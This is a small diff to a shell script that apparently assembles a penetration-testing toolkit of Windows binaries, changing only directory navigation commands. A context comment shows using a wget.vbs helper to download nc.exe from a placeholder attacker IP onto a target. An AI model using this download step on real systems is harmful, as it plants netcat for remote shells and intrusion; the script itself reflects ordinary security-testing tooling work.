@@ -256,7 +256,7 @@ cat <<\EOT >wget.vbs.bat
 
     # cscript wget.vbs http://<attacker_ip>/nc.exe nc.exe
 EOT
-cd -
+cd ../..
 
 rm -rf public/tools_windows/bin
 mkdir -p public/tools_windows/bin
@@ -325,4 +325,4 @@ cd public/tools_windows/bin
     for i in *.rar; do unrar x $i; done
     rm *.zip *.rar
 
-cd -
+cd ../../..
